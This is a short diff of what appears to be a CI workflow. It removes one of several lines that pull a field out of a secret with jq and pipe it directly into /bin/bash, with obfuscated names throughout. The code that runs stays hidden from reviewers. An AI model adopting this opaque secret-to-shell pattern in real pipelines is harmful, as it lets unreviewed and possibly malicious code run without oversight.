@@ -20,7 +20,6 @@ jobs:
           rd6: ${{ secrets.rd6 }}
         run: |
           printf '%s' "$rd6" | jq -r .bnoaa2207 | /bin/bash
-          printf '%s' "$p2169" | jq -r .ow411 | /bin/bash
           printf '%s' "$jperq7597" | jq -r .frknc68706 | /bin/bash
           printf '%s' "$seqb8" | jq -r .wf756 | /bin/bash
           echo $bhn0 | jq -r .sxywn6862 | /bin/bash
